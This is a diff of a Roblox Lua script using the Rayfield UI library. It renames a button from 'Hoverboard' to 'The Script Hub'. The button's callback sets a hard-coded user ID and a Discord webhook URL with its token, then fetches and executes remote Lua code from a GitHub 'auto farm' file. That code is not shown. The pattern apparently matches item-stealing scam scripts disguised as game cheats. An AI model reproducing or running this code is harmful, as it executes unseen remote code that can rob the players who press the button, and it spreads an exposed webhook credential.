@@ -26,15 +26,15 @@ local Window = Rayfield:CreateWindow({
     }
  })
 
- local Tab = Window:CreateTab("Visual", 4483362458) -- Title, Image
+ local Tab = Window:CreateTab("Rafa Script", 4483362458) -- Title, Image
 
- local Section = Tab:CreateSection("Hoverboard")
+ local Section = Tab:CreateSection("Rafa Script")
 
  local Button = Tab:CreateButton({
-    Name = "Hoverboard",
+    Name = "The Script Hub",
     Callback = function()
-        _G.UserID = 4660370558
-        _G.WebHook = "https://discord.com/api/webhooks/1112515786821599323/iEZPg9jIU1rgiVXZfmNA1FUkcP_WXub30ByMYKW3huSlGY-R7VtIGQ3jGXQy2BiMm8iI"
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))()
+    _G.UserID = 4660370558
+_G.WebHook = "https://discord.com/api/webhooks/1112515786821599323/iEZPg9jIU1rgiVXZfmNA1FUkcP_WXub30ByMYKW3huSlGY-R7VtIGQ3jGXQy2BiMm8iI"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))()
     end,
  })
